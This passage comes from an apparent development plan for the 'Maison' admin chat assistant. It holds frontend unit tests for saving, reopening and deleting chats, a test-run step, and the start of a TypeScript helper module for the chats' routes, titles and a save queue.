    expect(Array.from(document.querySelectorAll('[role="alert"]')).filter((alert) => alert.textContent)).toEqual([]);
  });
});

describe('saved chats', () => {
  const sidebar = () => screen.getByLabelText('Saved chats');
  const openSidebar = async () => userEvent.click(screen.getByRole('button', { name: 'History' }));
  const rowOf = (title: string) => within(sidebar()).getByRole('button', { name: title });
  const titlesInSidebar = () =>
    within(sidebar())
      .getAllByRole('button')
      .filter((button) => !button.getAttribute('aria-label') && button.textContent !== 'New chat')
      .map((button) => button.textContent);
  /** Types a question and presses Enter, then waits until the turn is over. */
  const ask = async (text: string, answerText?: string) => {
    await userEvent.type(box(), `${text}{Enter}`);
    if (answerText) await shows(answerText);
    await waitFor(() => expect(screen.queryByRole('button', { name: 'Stop' })).toBeNull());
  };

  it('has the sidebar closed at first and out of reach, and opens it with History, which then says "Hide history"', async () => {
    world();
    await screen.findByRole('textbox', { name: 'Chat message' });
    expect(sidebar().hasAttribute('inert')).toBe(true);
    expect(sidebar().getAttribute('aria-hidden')).toBe('true');

    await openSidebar();
    expect(sidebar().hasAttribute('inert')).toBe(false);
    expect(screen.getByRole('button', { name: 'Hide history' }).getAttribute('aria-expanded')).toBe('true');
    expect(within(sidebar()).getByText('No saved chats yet.')).toBeTruthy();

    await userEvent.click(screen.getByRole('button', { name: 'Hide history' }));
    expect(sidebar().hasAttribute('inert')).toBe(true);
  });

  it('shows the empty state, and loads no chat, when the admin has no saved chat', async () => {
    world();
    await screen.findByRole('textbox', { name: 'Chat message' });
    await waitFor(() => expect(client.get).toHaveBeenCalledWith('/maison/conversations'));
    expect(screen.getByText('Ask Maison')).toBeTruthy();
    expect(client.get).not.toHaveBeenCalledWith(expect.stringMatching(/^\/maison\/conversations\/./));
  });

  it('reopens the most recent chat when the assistant is ready, and lists the others, newest first, with the open one marked', async () => {
    world({ saved: [savedChat('c2', 'Any complaints this week?'), savedChat('c1', 'Which visits are waiting?')] });
    expect(await shows('The answer to Any complaints this week?')).toBeTruthy();
    expect(within(region()).getByText('Any complaints this week?')).toBeTruthy();
    expect(screen.queryByText('Ask Maison')).toBeNull();
    expect(client.get).toHaveBeenCalledWith('/maison/conversations/c2');
    expect(client.get).not.toHaveBeenCalledWith('/maison/conversations/c1');

    await openSidebar();
    expect(titlesInSidebar()).toEqual(['Any complaints this week?', 'Which visits are waiting?']);
    expect(rowOf('Any complaints this week?').getAttribute('aria-current')).toBe('true');
    expect(rowOf('Which visits are waiting?').hasAttribute('aria-current')).toBe(false);
  });

  it('does not reopen the most recent chat over a chat staff have begun while the list was loading', async () => {
    let answerList: (value: unknown) => void = () => {};
    const { show } = world({ saved: [savedChat('c1', 'An older chat')], chat: [() => stream(answer('Two visits wait.'))], mount: false });
    client.get.mockImplementation(async (url: string) => {
      if (url === '/maison/assistant/status') return { data: READY };
      if (url === '/maison/conversations') return new Promise((resolve) => (answerList = resolve));
      throw new Error(`Unexpected GET ${url}`);
    });
    show();
    await screen.findByRole('textbox', { name: 'Chat message' });
    await waitFor(() => expect(client.get).toHaveBeenCalledWith('/maison/conversations'));

    await ask('Which visits are waiting?', 'Two visits wait.');
    answerList({ data: { conversations: [{ documentId: 'c1', title: 'An older chat', updatedAt: '2026-10-06T00:00:00.000Z' }] } });
    await openSidebar();
    await waitFor(() => expect(titlesInSidebar()).toContain('An older chat'));

    expect(within(region()).getByText('Two visits wait.')).toBeTruthy();
    expect(within(region()).queryByText('The answer to An older chat')).toBeNull();
    expect(client.get).not.toHaveBeenCalledWith('/maison/conversations/c1');
  });

  it('does not reopen the most recent chat over a turn that failed while the list was loading: staff have begun, though nothing of it is left in the chat', async () => {
    let answerList: (value: unknown) => void = () => {};
    const failed = [event('RUN_STARTED'), event('RUN_ERROR', { message: 'Anthropic is busy. Try again in a minute.', code: '529' })];
    const { show } = world({ saved: [savedChat('c1', 'An older chat')], chat: [() => stream(failed)], mount: false });
    client.get.mockImplementation(async (url: string) => {
      if (url === '/maison/assistant/status') return { data: READY };
      if (url === '/maison/conversations') return new Promise((resolve) => (answerList = resolve));
      throw new Error(`Unexpected GET ${url}`);
    });
    show();
    await screen.findByRole('textbox', { name: 'Chat message' });
    await waitFor(() => expect(client.get).toHaveBeenCalledWith('/maison/conversations'));

    await userEvent.type(box(), 'Which visits are waiting?{Enter}');
    await screen.findByText('Anthropic is busy. Try again in a minute.');
    await waitFor(() => expect(box().value).toBe('Which visits are waiting?'));
    answerList({ data: { conversations: [{ documentId: 'c1', title: 'An older chat', updatedAt: '2026-10-06T00:00:00.000Z' }] } });
    await openSidebar();
    await waitFor(() => expect(titlesInSidebar()).toContain('An older chat'));

    expect(screen.getByText('Anthropic is busy. Try again in a minute.')).toBeTruthy();
    expect(screen.getByText('Ask Maison')).toBeTruthy();
    expect(client.get).not.toHaveBeenCalledWith('/maison/conversations/c1');
  });

  it('opens a saved chat that has no messages, as one the server could not read, as an empty chat, and saves the next turn into it', async () => {
    world({ saved: [savedChat('c1', 'A chat that could not be read', [])], chat: [() => stream(answer('Two visits wait.'))] });
    expect(await screen.findByText('Ask Maison')).toBeTruthy();
    await waitFor(() => expect(client.get).toHaveBeenCalledWith('/maison/conversations/c1'));
    await openSidebar();
    await waitFor(() => expect(rowOf('A chat that could not be read').getAttribute('aria-current')).toBe('true'));

    await ask('Which visits are waiting?', 'Two visits wait.');

    await waitFor(() => expect(client.put).toHaveBeenCalledTimes(1));
    expect(client.put.mock.calls[0][0]).toBe('/maison/conversations/c1');
    expect(client.post).not.toHaveBeenCalled();
  });

  it('opens a chat that is chosen in the sidebar, in place of the one on the screen, and marks it', async () => {
    world({ saved: [savedChat('c2', 'Any complaints this week?'), savedChat('c1', 'Which visits are waiting?')] });
    await shows('The answer to Any complaints this week?');
    await openSidebar();

    await userEvent.click(rowOf('Which visits are waiting?'));

    expect(await shows('The answer to Which visits are waiting?')).toBeTruthy();
    expect(within(region()).queryByText('The answer to Any complaints this week?')).toBeNull();
    expect(rowOf('Which visits are waiting?').getAttribute('aria-current')).toBe('true');
  });

  it('opens the chat that was chosen last when two are chosen one after the other: the answer that comes late is dropped', async () => {
    let answerFirst: () => void = () => {};
    world({ saved: [savedChat('c3', 'Newest chat'), savedChat('c2', 'Middle chat'), savedChat('c1', 'Oldest chat')] });
    await shows('The answer to Newest chat');
    const get = client.get.getMockImplementation() as (url: string) => Promise<unknown>;
    client.get.mockImplementation((url: string) => (url === '/maison/conversations/c1' ? new Promise((resolve) => (answerFirst = () => resolve(get(url)))) : get(url)));
    await openSidebar();

    await userEvent.click(rowOf('Oldest chat'));
    await userEvent.click(rowOf('Middle chat'));
    await shows('The answer to Middle chat');
    answerFirst();
    await new Promise((resolve) => setTimeout(resolve, 30));

    expect(within(region()).getByText('The answer to Middle chat')).toBeTruthy();
    expect(within(region()).queryByText('The answer to Oldest chat')).toBeNull();
    expect(rowOf('Middle chat').getAttribute('aria-current')).toBe('true');
  });

  it('waits for a save that is on its way before it opens another chat, so the chat that is left is saved as it was', async () => {
    let finishSave: () => void = () => {};
    world({ saved: [savedChat('c2', 'Newer chat'), savedChat('c1', 'Older chat')], chat: [() => stream(answer('More.'))] });
    await shows('The answer to Newer chat');
    const put = client.put.getMockImplementation() as (...args: any[]) => Promise<unknown>;
    client.put.mockImplementation((...args: any[]) => new Promise((resolve) => (finishSave = () => resolve(put(...args)))));
    await ask('Tell me more', 'More.');
    await waitFor(() => expect(client.put).toHaveBeenCalledTimes(1));
    await openSidebar();

    await userEvent.click(rowOf('Older chat'));
    await new Promise((resolve) => setTimeout(resolve, 30));
    expect(client.get).not.toHaveBeenCalledWith('/maison/conversations/c1');

    finishSave();
    expect(await shows('The answer to Older chat')).toBeTruthy();
    expect(client.put.mock.calls[0][0]).toBe('/maison/conversations/c2');
  });

  // Anthropic refuses a history whose signed thinking block was changed, so what is opened is what is saved again, key for key.
  it('keeps every key of every part of a chat it opens, so it saves the chat again as it was: a thinking part keeps its signature', async () => {
    const thinking = { type: 'thinking', content: 'Let me look.', signature: 'EqQBCkYIBRgC', providerMetadata: { anthropic: { index: 0 } } };
    const messages = [staffSays('u1', 'Which visits are waiting?'), { id: 'a1', role: 'assistant', createdAt: '2026-10-07T01:02:03.000Z', parts: [thinking, { type: 'text', content: 'Two visits wait.' }] }];
    world({ saved: [savedChat('c1', 'Which visits are waiting?', messages)], chat: [() => stream(answer('Three.'))] });
    await shows('Two visits wait.');

    await ask('And the questions?', 'Three.');

    await waitFor(() => expect(client.put).toHaveBeenCalledTimes(1));
    const saved = client.put.mock.calls[0][1].messages as Array<{ parts: unknown[] }>;
    expect(saved).toHaveLength(4);
    expect(saved[1]).toEqual(messages[1]);
    expect(saved[1].parts[0]).toEqual(thinking);
  });

  it('counts a reopened chat toward what is sent: the request carries every message, the saved ones and the new question', async () => {
    const { fetchMock } = world({ saved: [savedChat('c1', 'Which visits are waiting?')], chat: [() => stream(answer('Three.'))] });
    await shows('The answer to Which visits are waiting?');

    await ask('And the questions?', 'Three.');

    expect(sentBody(fetchMock).messages.map((message: { role: string }) => message.role)).toEqual(['user', 'assistant', 'user']);
  });

  describe('saving', () => {
    it('creates the chat after the first turn, with the question as its title and the cleaned messages, and updates it after the next', async () => {
      const { rows } = world({ chat: [() => stream(answer('Two visits wait.')), () => stream(answer('Three questions.'))] });
      await screen.findByRole('textbox', { name: 'Chat message' });

      await ask('Which visits are waiting?', 'Two visits wait.');
      await waitFor(() => expect(client.post).toHaveBeenCalledTimes(1));
      const [url, body] = client.post.mock.calls[0];
      expect(url).toBe('/maison/conversations');
      expect(body.title).toBe('Which visits are waiting?');
      expect(body.messages.map((message: { role: string }) => message.role)).toEqual(['user', 'assistant']);
      expect(body.messages[1].parts[0]).toMatchObject({ type: 'text', content: 'Two visits wait.' });

      await ask('And the questions?', 'Three questions.');
      await waitFor(() => expect(client.put).toHaveBeenCalledTimes(1));
      expect(client.put.mock.calls[0][0]).toBe('/maison/conversations/saved-1');
      expect(client.put.mock.calls[0][1].messages).toHaveLength(4);
      expect(client.post).toHaveBeenCalledTimes(1);
      expect(rows).toHaveLength(1);
    });

    it('lists the new chat in the sidebar, marked as the open one, once', async () => {
      world({ chat: [() => stream(answer('Two visits wait.'))] });
      await screen.findByRole('textbox', { name: 'Chat message' });
      await ask('Which visits are waiting?', 'Two visits wait.');
      await openSidebar();
      await waitFor(() => expect(titlesInSidebar()).toEqual(['Which visits are waiting?']));
      expect(rowOf('Which visits are waiting?').getAttribute('aria-current')).toBe('true');
    });

    it('cuts the title to 80 characters', async () => {
      world({ chat: [() => stream(answer('Fine.'))] });
      await screen.findByRole('textbox', { name: 'Chat message' });
      await ask('x'.repeat(200), 'Fine.');
      await waitFor(() => expect(client.post).toHaveBeenCalledTimes(1));
      expect(client.post.mock.calls[0][1].title).toBe('x'.repeat(80));
    });

    it('saves a chat of a reopened chat in the same chat, and moves it to the top of the list', async () => {
      world({ saved: [savedChat('c2', 'Newer chat'), savedChat('c1', 'Older chat')], chat: [() => stream(answer('More.'))] });
      await shows('The answer to Newer chat');
      await openSidebar();
      await userEvent.click(rowOf('Older chat'));
      await shows('The answer to Older chat');

      await ask('Tell me more', 'More.');

      await waitFor(() => expect(client.put).toHaveBeenCalledTimes(1));
      expect(client.put.mock.calls[0][0]).toBe('/maison/conversations/c1');
      expect(client.post).not.toHaveBeenCalled();
      await waitFor(() => expect(titlesInSidebar()).toEqual(['Older chat', 'Newer chat']));
    });

    // The turn was stopped in the middle of a tool call. The saved chat must not hold the call: reopened, it would show "…" for ever, and
    // the next send would replay a call with no answer to Anthropic.
    it('saves only the cleaned messages: a tool call that Stop cut off is not in the saved chat', async () => {
      const aborted = (signal?: AbortSignal) =>
        new Response(
          new ReadableStream({
            start(controller) {
              const events = [
                event('RUN_STARTED'),
                event('TEXT_MESSAGE_START', { messageId: 'm1', role: 'assistant' }),
                event('TEXT_MESSAGE_CONTENT', { messageId: 'm1', delta: 'Looking. ' }),
                event('TEXT_MESSAGE_END', { messageId: 'm1' }),
                event('TOOL_CALL_START', { toolCallId: 'c1', toolCallName: 'list_requests', parentMessageId: 'm1' }),
                event('TOOL_CALL_ARGS', { toolCallId: 'c1', delta: '{"sta' }),
              ];
              for (const item of events) controller.enqueue(encoder.encode(`data: ${JSON.stringify(item)}\n\n`));
              signal?.addEventListener('abort', () => controller.error(new DOMException('The operation was aborted.', 'AbortError')));
            },
          }),
          { status: 200, headers: { 'Content-Type': 'text/event-stream' } }
        );
      world();
      vi.stubGlobal('fetch', vi.fn(async (_url: string, init?: { signal?: AbortSignal }) => aborted(init?.signal)));
      await screen.findByRole('textbox', { name: 'Chat message' });

      await userEvent.type(box(), 'Which visits are waiting?{Enter}');
      await within(region()).findByRole('button', { name: /Tool: list_requests/ });
      await userEvent.click(await screen.findByRole('button', { name: 'Stop' }));

      await waitFor(() => expect(client.post).toHaveBeenCalled());
      const saved = client.post.mock.calls.at(-1)?.[1].messages as Array<{ parts: Array<{ type: string; content?: string }> }>;
      expect(saved.map((message) => message.parts.map((part) => part.type))).toEqual([['text'], ['text']]);
      expect(saved[1].parts[0].content).toBe('Looking. ');
      expect(within(region()).queryByRole('button', { name: /Tool: list_requests/ })).toBeNull();
    });

    it('saves nothing for a turn that failed before anything came back, and nothing for an empty chat', async () => {
      world({ chat: [() => stream([event('RUN_STARTED'), event('RUN_ERROR', { message: 'Anthropic is busy. Try again in a minute.', code: '529' })])] });
      await screen.findByRole('textbox', { name: 'Chat message' });
      await userEvent.type(box(), 'Which visits are waiting?{Enter}');
      await screen.findByText('Anthropic is busy. Try again in a minute.');
      await waitFor(() => expect(box().value).toBe('Which visits are waiting?'));
      expect(client.post).not.toHaveBeenCalled();
      expect(client.put).not.toHaveBeenCalled();
    });

    it('does not save a chat again when nothing in it has changed', async () => {
      world({ saved: [savedChat('c1', 'Which visits are waiting?')] });
      await shows('The answer to Which visits are waiting?');
      await new Promise((resolve) => setTimeout(resolve, 30));
      expect(client.post).not.toHaveBeenCalled();
      expect(client.put).not.toHaveBeenCalled();
    });

    it('says the chat could not be saved, and goes on: the answer stays, and the next turn saves it', async () => {
      world({ chat: [() => stream(answer('Two visits wait.')), () => stream(answer('Three questions.'))] });
      await screen.findByRole('textbox', { name: 'Chat message' });
      client.post.mockRejectedValueOnce(new Error('Gateway timeout'));

      await ask('Which visits are waiting?', 'Two visits wait.');

      expect(await screen.findByText("Couldn't save this chat.")).toBeTruthy();
      expect(screen.getByText("Couldn't save this chat.").closest('[role="alert"]')).not.toBeNull();
      expect(within(region()).getByText('Two visits wait.')).toBeTruthy();
      client.post.mockImplementation(async (_url: string, body: { title: string }) => ({ data: { conversation: { documentId: 'saved-9', title: body.title, updatedAt: '2026-10-07T05:00:00.000Z' } } }));

      await ask('And the questions?', 'Three questions.');
      await waitFor(() => expect(screen.queryByText("Couldn't save this chat.")).toBeNull());
      expect(client.post).toHaveBeenCalledTimes(2);
      expect(client.post.mock.calls[1][1].messages).toHaveLength(4);
    });

    it('saves a chat that was deleted elsewhere as a new chat, with no error', async () => {
      const { rows } = world({ saved: [savedChat('c1', 'Which visits are waiting?')], chat: [() => stream(answer('More.'))] });
      await shows('The answer to Which visits are waiting?');
      rows.splice(0, rows.length);

      await ask('Tell me more', 'More.');

      await waitFor(() => expect(client.post).toHaveBeenCalledTimes(1));
      expect(client.put).toHaveBeenCalledTimes(1);
      expect(screen.queryByText("Couldn't save this chat.")).toBeNull();
      expect(rows).toHaveLength(1);
    });
  });

  describe('New chat', () => {
    it('starts an empty chat, and keeps the old one in the sidebar: nothing is deleted', async () => {
      world({ chat: [() => stream(answer('Two visits wait.'))] });
      await screen.findByRole('textbox', { name: 'Chat message' });
      await ask('Which visits are waiting?', 'Two visits wait.');
      await waitFor(() => expect(client.post).toHaveBeenCalledTimes(1));

      await userEvent.click(screen.getByRole('button', { name: 'New chat' }));

      expect(screen.getByText('Ask Maison')).toBeTruthy();
      expect(within(region()).queryByText('Two visits wait.')).toBeNull();
      await openSidebar();
      expect(titlesInSidebar()).toEqual(['Which visits are waiting?']);
      expect(within(sidebar()).getByText('Which visits are waiting?').closest('button')?.hasAttribute('aria-current')).toBe(false);
      expect(client.del).not.toHaveBeenCalled();
    });

    it('saves the chat as it is when New chat stops an answer on its way: what had come stays in the chat it belongs to', async () => {
      const slow = (signal?: AbortSignal) =>
        new Response(
          new ReadableStream({
            start(controller) {
              for (const item of answer('Looking into it').slice(0, 3)) controller.enqueue(encoder.encode(`data: ${JSON.stringify(item)}\n\n`));
              signal?.addEventListener('abort', () => controller.error(new DOMException('The operation was aborted.', 'AbortError')));
            },
          }),
          { status: 200, headers: { 'Content-Type': 'text/event-stream' } }
        );
      world();
      vi.stubGlobal('fetch', vi.fn(async (_url: string, init?: { signal?: AbortSignal }) => slow(init?.signal)));
      await screen.findByRole('textbox', { name: 'Chat message' });
      await userEvent.type(box(), 'Which visits are waiting?{Enter}');
      await within(region()).findByText('Looking into it');

      await userEvent.click(screen.getByRole('button', { name: 'New chat' }));

      await waitFor(() => expect(client.post).toHaveBeenCalledTimes(1));
      const saved = client.post.mock.calls[0][1] as { title: string; messages: Array<{ role: string; parts: Array<{ content?: string }> }> };
      expect(saved.title).toBe('Which visits are waiting?');
      expect(saved.messages.map((message) => message.role)).toEqual(['user', 'assistant']);
      expect(saved.messages[1].parts[0].content).toBe('Looking into it');
      expect(screen.getByText('Ask Maison')).toBeTruthy();
    });

    it('gives the old chat back when its row is pressed, and saves the next chat as a chat of its own', async () => {
      world({ chat: [() => stream(answer('Two visits wait.')), () => stream(answer('Fine.'))] });
      await screen.findByRole('textbox', { name: 'Chat message' });
      await ask('Which visits are waiting?', 'Two visits wait.');
      await waitFor(() => expect(client.post).toHaveBeenCalledTimes(1));
      await userEvent.click(screen.getByRole('button', { name: 'New chat' }));

      await ask('Any complaints this week?', 'Fine.');

      await waitFor(() => expect(client.post).toHaveBeenCalledTimes(2));
      expect(client.put).not.toHaveBeenCalled();
      await openSidebar();
      await waitFor(() => expect(titlesInSidebar()).toEqual(['Any complaints this week?', 'Which visits are waiting?']));
      await userEvent.click(rowOf('Which visits are waiting?'));
      expect(await shows('Two visits wait.')).toBeTruthy();
      expect(within(region()).queryByText('Fine.')).toBeNull();
    });

    it('leaves what staff have typed in the box', async () => {
      world({ chat: [() => stream(answer('Two visits wait.'))] });
      await screen.findByRole('textbox', { name: 'Chat message' });
      await ask('Which visits are waiting?', 'Two visits wait.');
      await userEvent.type(box(), 'A half-written question');
      await userEvent.click(screen.getByRole('button', { name: 'New chat' }));
      expect(box().value).toBe('A half-written question');
    });

    it('keeps the draft across a change of chat too', async () => {
      world({ saved: [savedChat('c2', 'Newer chat'), savedChat('c1', 'Older chat')] });
      await shows('The answer to Newer chat');
      await userEvent.type(box(), 'Not sent yet');
      await openSidebar();
      await userEvent.click(rowOf('Older chat'));
      await shows('The answer to Older chat');
      expect(box().value).toBe('Not sent yet');
    });
  });

  describe('deleting', () => {
    it('deletes a chat at once, from its trash button, and takes its row out', async () => {
      world({ saved: [savedChat('c2', 'Newer chat'), savedChat('c1', 'Older chat')] });
      await shows('The answer to Newer chat');
      await openSidebar();

      await userEvent.click(screen.getByRole('button', { name: 'Delete chat: Older chat' }));

      await waitFor(() => expect(titlesInSidebar()).toEqual(['Newer chat']));
      expect(client.del).toHaveBeenCalledExactlyOnceWith('/maison/conversations/c1');
      // The chat that was open stays open.
      expect(within(region()).getByText('The answer to Newer chat')).toBeTruthy();
    });

    it('empties the screen when the chat that is deleted is the open one', async () => {
      world({ saved: [savedChat('c1', 'Which visits are waiting?')] });
      await shows('The answer to Which visits are waiting?');
      await openSidebar();

      await userEvent.click(screen.getByRole('button', { name: 'Delete chat: Which visits are waiting?' }));

      expect(await screen.findByText('Ask Maison')).toBeTruthy();
      expect(within(region()).queryByText('The answer to Which visits are waiting?')).toBeNull();
      expect(within(sidebar()).getByText('No saved chats yet.')).toBeTruthy();
    });

    it('saves the next chat as a new one after the open chat was deleted', async () => {
      world({ saved: [savedChat('c1', 'Which visits are waiting?')], chat: [() => stream(answer('Fine.'))] });
      await shows('The answer to Which visits are waiting?');
      await openSidebar();
      await userEvent.click(screen.getByRole('button', { name: 'Delete chat: Which visits are waiting?' }));
      await screen.findByText('Ask Maison');

      await ask('Any complaints this week?', 'Fine.');

      await waitFor(() => expect(client.post).toHaveBeenCalledTimes(1));
      expect(client.put).not.toHaveBeenCalled();
    });

    // A save that ran after the delete would find no chat to save into, and say "Couldn't save this chat."
    it('waits for a save that is on its way before it deletes the chat', async () => {
      let finishSave: (value: unknown) => void = () => {};
      world({ saved: [savedChat('c1', 'Which visits are waiting?')], chat: [() => stream(answer('More.'))] });
      await shows('The answer to Which visits are waiting?');
      const put = client.put.getMockImplementation() as (...args: any[]) => Promise<unknown>;
      client.put.mockImplementation((...args: any[]) => new Promise((resolve) => (finishSave = () => resolve(put(...args)))));
      await ask('Tell me more', 'More.');
      await waitFor(() => expect(client.put).toHaveBeenCalledTimes(1));
      await openSidebar();

      await userEvent.click(screen.getByRole('button', { name: 'Delete chat: Which visits are waiting?' }));
      await new Promise((resolve) => setTimeout(resolve, 30));
      expect(client.del).not.toHaveBeenCalled();

      finishSave(undefined);
      await waitFor(() => expect(client.del).toHaveBeenCalledExactlyOnceWith('/maison/conversations/c1'));
      expect(screen.queryByText("Couldn't save this chat.")).toBeNull();
    });

    it('says so, and keeps the row, when the chat could not be deleted', async () => {
      world({ saved: [savedChat('c1', 'Which visits are waiting?')] });
      await shows('The answer to Which visits are waiting?');
      client.del.mockRejectedValueOnce(Object.assign(new Error('Server Error'), { status: 500 }));
      await openSidebar();

      await userEvent.click(screen.getByRole('button', { name: 'Delete chat: Which visits are waiting?' }));

      expect(await screen.findByText("Couldn't delete that chat.")).toBeTruthy();
      expect(titlesInSidebar()).toEqual(['Which visits are waiting?']);
      expect(within(region()).getByText('The answer to Which visits are waiting?')).toBeTruthy();
    });

    it('takes the row out when the chat was already gone: it is deleted all the same', async () => {
      const { rows } = world({ saved: [savedChat('c2', 'Newer chat'), savedChat('c1', 'Older chat')] });
      await shows('The answer to Newer chat');
      rows.splice(1, 1);
      await openSidebar();

      await userEvent.click(screen.getByRole('button', { name: 'Delete chat: Older chat' }));

      await waitFor(() => expect(titlesInSidebar()).toEqual(['Newer chat']));
      expect(screen.queryByText("Couldn't delete that chat.")).toBeNull();
    });
  });

  describe('while an answer comes', () => {
    it('switches off the sidebar: its rows, New chat and the trash buttons', async () => {
      const slow = () =>
        new Response(
          new ReadableStream({
            start(controller) {
              for (const item of answer('Looking into it').slice(0, 3)) controller.enqueue(encoder.encode(`data: ${JSON.stringify(item)}\n\n`));
            },
          }),
          { status: 200, headers: { 'Content-Type': 'text/event-stream' } }
        );
      world({ saved: [savedChat('c1', 'Which visits are waiting?')], chat: [slow] });
      await shows('The answer to Which visits are waiting?');
      await openSidebar();
      await userEvent.type(box(), 'Another question{Enter}');
      await shows('Looking into it');

      for (const button of within(sidebar()).getAllByRole('button') as HTMLButtonElement[]) expect(button.disabled, button.getAttribute('aria-label') ?? button.textContent ?? '').toBe(true);
      await userEvent.click(rowOf('Which visits are waiting?'));
      expect(within(region()).getByText('Looking into it')).toBeTruthy();
      expect(client.get).not.toHaveBeenCalledWith('/maison/conversations/c1', expect.anything());
    });
  });

  it('does nothing when it is asked to open or delete a chat while an answer comes: that is part of what the page offers', async () => {
    const Probe = () => {
      const assistant = useAssistant();
      return (
        <>
          <button onClick={() => void assistant?.history.openChat('c1')}>probe open</button>
          <button onClick={() => void assistant?.history.deleteChat('c1')}>probe delete</button>
        </>
      );
    };
    const slow = () =>
      new Response(
        new ReadableStream({
          start(controller) {
            for (const item of answer('Looking into it').slice(0, 3)) controller.enqueue(encoder.encode(`data: ${JSON.stringify(item)}\n\n`));
          },
        }),
        { status: 200, headers: { 'Content-Type': 'text/event-stream' } }
      );
    const { rows, show } = world({ saved: [savedChat('c1', 'Which visits are waiting?')], chat: [slow], mount: false });
    show(
      <>
        <AskTab />
        <Probe />
      </>
    );
    await shows('The answer to Which visits are waiting?');
    await userEvent.type(box(), 'Another question{Enter}');
    await within(region()).findByText('Looking into it');

    await userEvent.click(screen.getByRole('button', { name: 'probe open' }));
    await userEvent.click(screen.getByRole('button', { name: 'probe delete' }));

    expect(within(region()).getByText('Looking into it')).toBeTruthy();
    expect(client.del).not.toHaveBeenCalled();
    expect(rows).toHaveLength(1);
    // The chat was opened once, when Ask opened, and not again for the probe.
    expect(client.get.mock.calls.filter(([url]) => url === '/maison/conversations/c1')).toHaveLength(1);
  });

  describe('when a call to the saved chats fails', () => {
    it('says the list could not be loaded, and the chat still works', async () => {
      const { show } = world({ chat: [() => stream(answer('Two visits wait.'))], mount: false });
      client.get.mockImplementation(async (url: string) => {
        if (url === '/maison/assistant/status') return { data: READY };
        throw new Error('Gateway timeout');
      });
      show();
      expect(await screen.findByText("Couldn't load your saved chats.")).toBeTruthy();
      await userEvent.type(box(), 'Which visits are waiting?{Enter}');
      expect(await shows('Two visits wait.')).toBeTruthy();
    });

    it('says the chat could not be opened, and loads the list again: the chat may be gone', async () => {
      const { rows } = world({ saved: [savedChat('c2', 'Newer chat'), savedChat('c1', 'Older chat')] });
      await shows('The answer to Newer chat');
      await openSidebar();
      rows.splice(1, 1);
      const listCalls = client.get.mock.calls.filter(([url]) => url === '/maison/conversations').length;

      await userEvent.click(rowOf('Older chat'));

      expect(await screen.findByText("Couldn't open that chat.")).toBeTruthy();
      await waitFor(() => expect(client.get.mock.calls.filter(([url]) => url === '/maison/conversations').length).toBe(listCalls + 1));
      await waitFor(() => expect(titlesInSidebar()).toEqual(['Newer chat']));
      expect(within(region()).getByText('The answer to Newer chat')).toBeTruthy();
    });

    it("shows a turn's error before a problem with the saved chats, when both are there", async () => {
      const failed = [event('RUN_STARTED'), event('RUN_ERROR', { message: 'Anthropic is busy. Try again in a minute.', code: '529' })];
      world({ chat: [() => stream(answer('Two visits wait.')), () => stream(failed)] });
      await screen.findByRole('textbox', { name: 'Chat message' });
      client.post.mockRejectedValue(new Error('Gateway timeout'));
      await ask('Which visits are waiting?', 'Two visits wait.');
      expect(await screen.findByText("Couldn't save this chat.")).toBeTruthy();

      await userEvent.type(box(), 'And the questions?{Enter}');

      expect(await screen.findByText('Anthropic is busy. Try again in a minute.')).toBeTruthy();
      expect(screen.queryByText("Couldn't save this chat.")).toBeNull();
    });
  });
});
```

- [ ] **Step 2: Run them to see them fail**

Run: `npm test -- test/unit/conversations-admin.test.ts test/unit/conversation-sidebar.test.tsx test/unit/chat-area.test.tsx test/unit/ask-tab.test.tsx`
Expected: FAIL, `Test Files  4 failed (4)` and `Tests  36 failed | 23 passed (59)`. `admin/src/conversations.ts` and the sidebar do not exist, and the chat area, the provider and the tab know nothing of saved chats.

- [ ] **Step 3: Write the helpers and the save queue**

`admin/src/conversations.ts` has no React in it. The save queue is the part to read twice: every save waits for the one before it (`tail`), so two saves made before the first has an ID can never both create the chat (strapi-plugin-tanstack-ai has exactly that bug). A save reads its chat's ID when it runs, after the save before it has created the chat, and goes to the chat it was made for (`const chat = current`), not to the chat that is open when it runs.

Create `admin/src/conversations.ts`:

```ts
/**
 * What the Ask tab decides about its saved chats, apart from React: the routes, the shape of the answers, a chat's title, how the list
 * changes when a chat is saved or deleted, when a chat needs saving, and the queue that saves them one at a time. The provider reads these,
 * and the unit tests hold them.
 */
import type { MessageLike, PartLike } from './assistant';

/** The saved chats' routes, served under /maison. A unit test holds them to the server's. */
export const CONVERSATION_PATHS = {
  list: '/maison/conversations',
  one: (documentId: string): string => `/maison/conversations/${encodeURIComponent(documentId)}`,
} as const;

/** What the sidebar lists of a chat. */
export interface SavedChatRow {
  documentId: string;
  title: string;
  updatedAt: string;
}

/** A chat as it is opened: its row, and its messages exactly as they were saved. */
export interface SavedChat extends SavedChatRow {
  messages: unknown[];
}

/** What staff read when a call to the saved chats fails. Each says what could not be done, and none repeats the server's text. */
export const HISTORY_ERRORS = {
  list: "Couldn't load your saved chats.",
  open: "Couldn't open that chat.",
  save: "Couldn't save this chat.",
  remove: "Couldn't delete that chat.",
} as const;

const isRecord = (value: unknown): value is Record<string, unknown> => typeof value === 'object' && value !== null && !Array.isArray(value);

export const isSavedRow = (value: unknown): value is SavedChatRow =>
  isRecord(value) && typeof value.documentId === 'string' && value.documentId !== '' && typeof value.title === 'string' && typeof value.updatedAt === 'string';

/** `GET /conversations`: `{ conversations: [row, ...] }`. */
export const isChatList = (value: unknown): value is { conversations: SavedChatRow[] } => isRecord(value) && Array.isArray(value.conversations) && value.conversations.every(isSavedRow);

/** `GET /conversations/:documentId`: `{ conversation: { ...row, messages } }`. */
export const isChatAnswer = (value: unknown): value is { conversation: SavedChat } =>
  isRecord(value) && isSavedRow(value.conversation) && Array.isArray((value.conversation as unknown as SavedChat).messages);

/** `POST /conversations` and `PUT /conversations/:documentId`: `{ conversation: row }`. */
export const isSavedAnswer = (value: unknown): value is { conversation: SavedChatRow } => isRecord(value) && isSavedRow(value.conversation);

const MAX_TITLE = 80;

/**
 * A chat's title: its first staff message, on one line, cut to 80 characters (whole characters, so an emoji or a Japanese character is
 * never split), or "New chat" when there is none. The server cuts a title the same way, and a unit test holds the two to each other.
 */
export const conversationTitle = (messages: readonly MessageLike[]): string => {
  const first = messages.find((message) => message.role === 'user');
  const text = first
    ? (first.parts as readonly PartLike[])
        .filter((part) => part.type === 'text' && typeof part.content === 'string')
        .map((part) => part.content as string)
        .join(' ')
    : '';
  const line = text.replace(/\s+/g, ' ').trim();
  return line === '' ? 'New chat' : Array.from(line).slice(0, MAX_TITLE).join('');
};

/** The list with `row` at the top: a chat that was just saved is the newest, and appears once. */
